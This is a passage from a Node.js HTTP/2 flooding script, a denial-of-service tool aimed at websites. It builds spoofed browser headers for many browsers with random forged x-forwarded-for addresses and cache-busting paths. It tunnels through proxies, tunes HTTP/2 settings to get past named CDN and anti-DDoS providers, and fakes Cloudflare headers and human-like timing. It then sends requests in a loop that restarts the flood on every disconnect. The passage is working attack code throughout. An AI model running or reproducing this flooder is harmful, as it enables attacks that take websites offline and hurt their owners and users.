    "user-agent": userAgent.yandex,
    "accept-language": "ru-RU,ru;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://yandex.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  aloha: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Aloha";v="${Math.floor(3 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.aloha,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  kiwi: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Kiwi";v="${Math.floor(120 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.kiwi,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  bromite: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Bromite";v="${Math.floor(120 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.bromite,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  falkon: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.falkon,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  midori: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.midori,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  palemoon: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.palemoon,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  waterfox: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.waterfox,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  librewolf: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.librewolf,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  tor: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.tor,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  bravenightly: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Brave";v="${Math.floor(130 + Math.random() * 10)}", "Chromium";v="${Math.floor(130 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.bravenightly,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br, zstd",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  "chrome-canary": {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Google Chrome";v="${Math.floor(135 + Math.random() * 10)}", "Chromium";v="${Math.floor(135 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent["chrome-canary"],
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br, zstd",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  "firefox-nightly": {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent["firefox-nightly"],
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br, zstd",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  "opera-crypto": {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Opera";v="${Math.floor(110 + Math.random() * 8)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent["opera-crypto"],
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.opera.com/crypto" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  "vivaldi-snapshot": {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Vivaldi";v="${Math.floor(7 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent["vivaldi-snapshot"],
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://vivaldi.com/snapshot" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  }
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
                            ...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
                        }

                        let allHeaders = Object.assign({}, headers, headers4);
                        dyn = {
	...(Math.random() < 0.5 ?{['cf-sec-with-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
 ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),			  
},
                      dyn2 = {
                        ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : {}),
                        ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
                        ...(Math.random() < 0.5 ? { "cf-ray": "ray-" + generateRandomString(16, 20)} : {}),
                        ...(Math.random() < 0.5 ? { "cf-request-id": "req-" + generateRandomString(20, 30)} : {}),
                        ...(Math.random() < 0.5 ? { "cf-warp-tag-id": "warp-" + generateRandomString(10, 15)} : {}),
                        "RTT" : "1"

                      }  

const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
       secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            console.error('Cipher info is not available. TLS handshake may not have completed.');
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
    
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: Math.random() < 0.5 ? 6291456: 33554432,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 16384,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        if (isp === 'Cloudflare, Inc.') {
            settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16384;
            settings.enableConnectProtocol = false;
        } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
        } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
        } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
        } else if (isp === 'Ddos-guard LTD') {
            settings.maxConcurrentStreams = 8;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
        } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
        } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
        } else if (isp === 'Google LLC') {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
        } else {
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
        }
    
        return settings;
    }
    
    let hpack = new HPACK();
    let client;
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : getSettingsBasedOnISP(isp),
        socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });

    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
});

    clients.forEach(client => {
    const intervalId = setInterval(() => {
        async function sendRequests() {
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };

            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];

            const dynHeaders = shuffleObject({
                ...dyn,
                ...allHeaders,
                ...dyn2,
                ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
            });

            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);

            const streamId = 1;
            const requests = [];
            let count = 0;

            const increaseRequestRate = async (client, dynHeaders, args) => {
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    // HUMAN-LIKE REQUEST RATE - pake fungsi HumanBehavior
                    const humanDelay = human.getHumanDelay();
                    const batchSize = Math.floor(Math.random() * 3) + 1;
                    
                    for (let i = 0; i < Math.min(args.Rate, batchSize); i++) {
                        // Delay antara request kayak manusia (50-800ms)
                        await new Promise(resolve => setTimeout(resolve, humanDelay * Math.random()));
                        
                        // Simulasi mouse movement dan scrolling sebelum request (kayak manusia browsing)
                        if (Math.random() < 0.2) {
                            human.simulateHumanMouseMovement(null, null, { minMoves: 3, maxMoves: 8 });
                        }
                        if (Math.random() < 0.15) {
                            human.simulateHumanScrolling(null, Math.random() * 500 + 200, { minSteps: 3, maxSteps: 10 });
                        }
                        if (Math.random() < 0.1) {
                            human.simulateNaturalPageBehavior(null);
                        }
                        
                        const requestPromise = new Promise((resolve, reject) => {
                            const req = client.request(dynHeaders, {
                                weight: Math.random() < 0.5 ? 251 : 231,
                                depends_on: 0,
                                exclusive: Math.random() < 0.5 ? true : false,
                            })
                            .on('response', response => {
                                req.close(http2.constants.NO_ERROR);
                                req.destroy();
                                resolve();
                            });
                            req.on('end', () => {
                                count++;
                                if (count === args.time * args.Rate) {
                                    clearInterval(intervalId);
                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                }
                                reject(new Error('Request timed out'));
                            });

                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                        });

                        const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                        requests.push({ requestPromise, frame });
                    }

                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                }
            }

            await increaseRequestRate(client, dynHeaders, args);
        }

        sendRequests();
    }, 500);
});

    
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});